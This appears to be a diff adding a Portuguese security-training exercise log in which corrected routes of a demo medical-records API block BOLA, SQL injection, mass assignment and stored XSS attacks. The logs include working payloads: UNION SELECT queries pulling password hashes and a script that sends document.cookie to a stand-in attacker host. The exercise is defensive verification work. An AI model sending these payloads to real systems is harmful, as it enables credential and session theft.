@@ -1,0 +1,184 @@
+====================================================================================================
+EXERCÍCIO 9 - Mesmos ataques contra as rotas corrigidas
+====================================================================================================
+
+V1 BOLA: exigir_posse(...) devolve 403 e registra a negação na trilha de auditoria.
+
+> GET /consultas/1
+> Authorization: Bearer <token paciente João>
+< HTTP 200
+{
+  "id": 1,
+  "paciente_id": 1,
+  "paciente_nome": "João Batista",
+  "profissional_id": 1,
+  "profissional_nome": "Dra. Helena Prado",
+  "inicio": "2026-10-03T09:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Dor no peito ao esforço, avaliar ECG",
+  "observacoes": "Trazer exames anteriores"
+}
+
+> GET /consultas/2
+> Authorization: Bearer <token paciente João>
+< HTTP 403
+{
+  "detail": "Acesso negado a este recurso"
+}
+
+V2 SQL injection: a whitelist recusa o termo antes do banco (422, sem refletir o payload).
+
+> GET /pacientes/busca?nome=Pedro
+> Authorization: Bearer <token Recepção>
+< HTTP 200
+[
+  {
+    "id": 3,
+    "nome": "Pedro Albuquerque",
+    "cpf_mascarado": "***.091.390-**",
+    "data_nascimento": "1975-02-28",
+    "email": "pedro@paciente.dev",
+    "telefone": "(21) 3456-7890",
+    "profissional_responsavel_id": 1
+  }
+]
+
+> GET /pacientes/busca?nome=%27+OR+%271%27%3D%271
+> Authorization: Bearer <token Recepção>
+< HTTP 422
+{
+  "detail": "Termo de busca inválido: use apenas letras, dígitos, espaço, ponto e hífen (2 a 60 caracteres)."
+}
+
+> GET /pacientes/busca?nome=x%27+UNION+SELECT+id%2C+email%2C+senha_hash%2C+papel+FROM+usuario+--
+> Authorization: Bearer <token Recepção>
+< HTTP 422
+{
+  "detail": "Termo de busca inválido: use apenas letras, dígitos, espaço, ponto e hífen (2 a 60 caracteres)."
+}
+
+V3 mass assignment: extra='forbid' recusa os campos não declarados.
+
+> POST /consultas
+> Authorization: Bearer <token Dra. Helena>
+> corpo (json): {"paciente_id": 3, "inicio": "2026-10-04T17:00:00", "motivo": "Consulta forjada", "profissional_id": 2, "criado_por_id": 4, "token_auditoria": "aud_forjado"}
+< HTTP 422
+{
+  "detail": [
+    {
+      "type": "extra_forbidden",
+      "loc": [
+        "body",
+        "profissional_id"
+      ],
+      "msg": "Extra inputs are not permitted"
+    },
+    {
+      "type": "extra_forbidden",
+      "loc": [
+        "body",
+        "criado_por_id"
+      ],
+      "msg": "Extra inputs are not permitted"
+    },
+    {
+      "type": "extra_forbidden",
+      "loc": [
+        "body",
+        "token_auditoria"
+      ],
+      "msg": "Extra inputs are not permitted"
+    }
+  ]
+}
+
+V4 XSS armazenado: o mesmo payload, gravado pela mesma rota, sai codificado pelo autoescape na agenda corrigida.
+
+> PUT /consultas/1
+> Authorization: Bearer <token Dra. Helena>
+> corpo (json): {"inicio": "2026-10-04T09:00:00", "duracao_minutos": 30, "status": "agendada", "motivo": "Dor no peito", "observacoes": "<script>fetch('https://atacante.exemplo/?c='+document.cookie)</script>"}
+< HTTP 200
+{
+  "id": 1,
+  "paciente_id": 1,
+  "paciente_nome": "João Batista",
+  "profissional_id": 1,
+  "profissional_nome": "Dra. Helena Prado",
+  "inicio": "2026-10-04T09:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Dor no peito",
+  "observacoes": "<script>fetch('https://atacante.exemplo/?c='+document.cookie)</script>"
+}
+<td>&lt;script&gt;fetch(&#39;https://atacante.exemplo/?c=&#39;+document.cookie)&lt;/script&gt;</td>
+
+Endpoint não citado no Ex. 8 com o mesmo padrão de BOLA: GET /pacientes/{id}.
+
+Antes (versão vulnerável): a Dra. Helena lê o cadastro da paciente Maria, que é do Dr. Marcos.
+
+> GET /inseguro/pacientes/2
+> Authorization: Bearer <token Dra. Helena>
+< HTTP 200
+{
+  "id": 2,
+  "nome": "Maria Fernandes",
+  "cpf_mascarado": "***.016.613-**",
+  "data_nascimento": "1992-11-03",
+  "email": "maria@paciente.dev",
+  "telefone": "(21) 98765-4321",
+  "profissional_responsavel_id": 2
+}
+
+Depois (mesma fábrica exigir_posse aplicada):
+
+> GET /pacientes/2
+> Authorization: Bearer <token Dra. Helena>
+< HTTP 403
+{
+  "detail": "Acesso negado a este recurso"
+}
+
+> GET /pacientes/1
+> Authorization: Bearer <token Dra. Helena>
+< HTTP 200
+{
+  "id": 1,
+  "nome": "João Batista",
+  "cpf_mascarado": "***.018.159-**",
+  "data_nascimento": "1980-05-12",
+  "email": "joao@paciente.dev",
+  "telefone": "(21) 99876-5432",
+  "profissional_responsavel_id": 1
+}
+
+Middleware JWT centralizado: qualquer rota fora da allowlist pública exige token válido, inclusive rotas novas.
+
+> GET /consultas/1
+< HTTP 401
+{
+  "detail": "Autenticação necessária"
+}
+
+> GET /rota-que-ainda-nao-existe
+< HTTP 401
+{
+  "detail": "Autenticação necessária"
+}
+
+> GET /consultas/1
+> Authorization: Bearer token.forjado.qualquer
+< HTTP 401
+{
+  "detail": "Token inválido"
+}
+
+Trilha de auditoria (administrador com MFA):
+  2026-10-04T00:28:53 ator=1                      acao=login                  recurso=sessao#           resultado=sucesso
+  2026-10-04T00:28:53 ator=3                      acao=ler_paciente           recurso=Paciente#1          resultado=permitido
+  2026-10-04T00:28:53 ator=3                      acao=ler_paciente           recurso=Paciente#2          resultado=negado
+  2026-10-04T00:28:53 ator=2                      acao=login                  recurso=sessao#           resultado=sucesso
+  2026-10-04T00:28:53 ator=3                      acao=alterar_consulta       recurso=Consulta#1          resultado=permitido
+  2026-10-04T00:28:53 ator=5                      acao=ler_consulta           recurso=Consulta#2          resultado=negado
+  2026-10-04T00:28:53 ator=5                      acao=ler_consulta           recurso=Consulta#1          resultado=permitido
+  2026-10-04T00:28:53 ator=2                      acao=login                  recurso=sessao#           resultado=sucesso
